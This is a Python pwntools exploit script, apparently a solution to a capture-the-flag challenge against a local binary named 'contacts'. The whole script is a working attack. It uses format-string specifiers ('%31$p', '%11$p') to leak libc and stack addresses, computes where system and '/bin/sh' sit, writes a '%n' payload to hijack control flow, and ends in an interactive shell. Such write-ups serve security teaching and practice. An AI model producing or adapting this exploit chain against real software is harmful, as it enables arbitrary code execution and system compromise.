from pwn import *

p = process('./contacts')
libc = ELF('libc.so')
context.log_level = 'debug'

p.recvuntil('>>> ')
p.sendline('1')
p.recvuntil('Name: ')
p.sendline('hello')
p.recvuntil('Enter Phone No: ')
p.sendline('111111')
p.recvuntil('Length of description: ')
p.sendline('100')
p.recvuntil('\n')
p.sendline('%31$p')
p.recvuntil('>>> ')
p.sendline('4')
p.recvuntil('Description: ')
data = p.recvuntil('\n')
data = data.split('\n')[0]
data = int(data,16) - 247
print hex(data)
base = data - libc.symbols['__libc_start_main']
system_addr = base + libc.symbols['system']
bin_addr = system_addr + 0x120c6b
#gdb.attach(p)
print hex(system_addr),hex(bin_addr)

p.recvuntil('>>> ')
p.sendline('3')
p.recvuntil('Name to change? ')
p.sendline('hello')
p.recvuntil('>>> ')
p.sendline('2')
p.recvuntil('Length of description: ')
p.sendline('100')
sleep(1)
p.sendline('%11$p')
p.recvuntil('>>> ')
p.sendline('4')
p.recvuntil('Description: ')
data2 = p.recvuntil('\n').split('\n')[0]
data2 = int(data2,16)
print hex(data2)

p.recvuntil('>>> ')
p.sendline('3')
p.recvuntil('Name to change? ')
p.sendline('hello')
p.recvuntil('>>> ')
p.sendline('2')
p.recvuntil('Length of description: ')
p.sendline('100')
sleep(1)
playload = p32(system_addr) + 'AAAA' + p32(bin_addr)
playload += '%' + str(data2 - 4 - 12) + 'd%6$n'
p.sendline(playload)
p.recvuntil('>>> ')
p.sendline('4')
p.recvuntil('>>> ')
p.sendline('5')

p.interactive()
